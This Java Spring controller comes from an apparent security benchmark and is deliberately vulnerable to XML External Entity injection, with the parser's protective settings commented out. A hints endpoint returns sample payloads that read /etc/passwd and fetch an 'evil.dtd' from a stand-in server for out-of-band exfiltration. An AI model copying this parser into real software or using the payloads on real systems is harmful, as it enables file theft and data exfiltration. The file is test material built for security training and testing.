package com.strike7.xxe;

import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;
import java.util.HashMap;
import java.util.Map;

/**
 * SBEN-XXE-01: XML Controller with XXE Vulnerabilities
 *
 * INTENTIONALLY VULNERABLE CODE - DO NOT USE IN PRODUCTION
 *
 * This controller demonstrates XXE (XML External Entity) injection
 * vulnerabilities in Java XML parsing.
 */
@RestController
@RequestMapping("/api/xml")
public class XmlController {

    /**
     * CRITICAL VULNERABILITY: Unsafe XML parsing with external entity resolution
     *
     * This endpoint accepts XML data and parses it using DocumentBuilder
     * WITHOUT disabling external entity resolution, making it vulnerable to:
     * 1. Local file disclosure (file:// protocol)
     * 2. Internal network scanning (http:// protocol)
     * 3. Denial of Service (billion laughs attack)
     * 4. Out-of-band data exfiltration
     */
    @PostMapping("/parse")
    public Map<String, Object> parseXml(@RequestBody String xmlContent) {
        Map<String, Object> response = new HashMap<>();

        try {
            System.out.println("[VULNERABLE] Parsing XML with external entities ENABLED");
            System.out.println("[VULNERABLE] XML Content: " + xmlContent.substring(0, Math.min(200, xmlContent.length())));

            // CRITICAL: Create DocumentBuilderFactory WITHOUT security features
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

            // VULNERABILITY: External entities are ENABLED by default
            // These settings should be used for security but are NOT:
            // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            // factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            // factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            // factory.setExpandEntityReferences(false);

            DocumentBuilder builder = factory.newDocumentBuilder();

            // Parse the XML (UNSAFE - allows external entity resolution)
            InputSource inputSource = new InputSource(new StringReader(xmlContent));
            Document document = builder.parse(inputSource);

            // Extract and return parsed data
            Element root = document.getDocumentElement();
            String rootTagName = root.getTagName();

            // Get all child elements
            NodeList children = root.getChildNodes();
            Map<String, String> parsedData = new HashMap<>();

            for (int i = 0; i < children.getLength(); i++) {
                if (children.item(i) instanceof Element) {
                    Element child = (Element) children.item(i);
                    parsedData.put(child.getTagName(), child.getTextContent());
                }
            }

            response.put("success", true);
            response.put("rootElement", rootTagName);
            response.put("parsedData", parsedData);
            response.put("warning", "XML parsed with external entity resolution ENABLED");

            return response;

        } catch (Exception e) {
            System.err.println("[ERROR] XML parsing failed: " + e.getMessage());
            e.printStackTrace();

            response.put("success", false);
            response.put("error", e.getClass().getSimpleName());
            response.put("message", e.getMessage());
            response.put("hint", "XML parsing error - check your XML syntax and DTD references");

            return response;
        }
    }

    /**
     * Simple endpoint to test basic XML parsing
     */
    @GetMapping("/example")
    public Map<String, Object> getExample() {
        Map<String, Object> response = new HashMap<>();

        String exampleXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<user>\n" +
            "  <name>Alice</name>\n" +
            "  <email>alice@example.com</email>\n" +
            "  <role>admin</role>\n" +
            "</user>";

        response.put("exampleXml", exampleXml);
        response.put("endpoint", "POST /api/xml/parse");
        response.put("contentType", "application/xml or text/plain");
        response.put("description", "Submit XML to this endpoint for parsing");

        return response;
    }

    /**
     * Endpoint providing XXE exploitation hints
     */
    @GetMapping("/hints")
    public Map<String, Object> getHints() {
        Map<String, Object> response = new HashMap<>();

        response.put("vulnerability", "XXE (XML External Entity) Injection");
        response.put("hint1", "External entities are enabled in XML parser");
        response.put("hint2", "Use <!DOCTYPE> and <!ENTITY> to define external entities");
        response.put("hint3", "file:// protocol can read local files");
        response.put("hint4", "http:// protocol can access external resources");
        response.put("hint5", "Parameter entities (%entity;) enable out-of-band exfiltration");

        response.put("exampleXxe",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
            "<data>&xxe;</data>");

        response.put("exampleOOB",
            "<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://dtd-server:8888/evil.dtd\"> %dtd;]>\n" +
            "<data>&send;</data>");

        return response;
    }

    /**
     * Home endpoint with documentation
     */
    @GetMapping("/")
    public String home() {
        return "<!DOCTYPE html>" +
            "<html><head><title>SBEN-XXE-01</title>" +
            "<style>body{font-family:monospace;max-width:800px;margin:50px auto;padding:20px;background:#1e1e1e;color:#00ff00;}" +
            "h1{color:#ff6b6b;}code{background:#2d2d2d;padding:2px 6px;color:#ffa500;}" +
            ".warning{background:#ff6b6b;color:white;padding:10px;border-radius:5px;}</style></head>" +
            "<body><h1>🔓 SBEN-XXE-01: XXE Out-of-Band Exfiltration</h1>" +
            "<div class='warning'><strong>⚠️ WARNING:</strong> This application contains intentional XXE vulnerabilities.</div>" +
            "<h2>Endpoints</h2>" +
            "<ul>" +
            "<li><code>POST /api/xml/parse</code> - Parse XML (VULNERABLE to XXE)</li>" +
            "<li><code>GET /api/xml/example</code> - Get example XML</li>" +
            "<li><code>GET /api/xml/hints</code> - Get XXE exploitation hints</li>" +
            "<li><code>GET /actuator/health</code> - Health check</li>" +
            "</ul>" +
            "<h2>Vulnerabilities</h2>" +
            "<ul>" +
            "<li><strong>CWE-611:</strong> XML External Entity (XXE) injection</li>" +
            "<li><strong>CUSTOM-XXE-01:</strong> DocumentBuilder without security features</li>" +
            "<li><strong>CUSTOM-XXE-02:</strong> Out-of-band XXE via external DTD</li>" +
            "</ul>" +
            "<p style='text-align:center;margin-top:50px;color:#888;'>Strike7 Security Benchmarks - Phase 4</p>" +
            "</body></html>";
    }
}
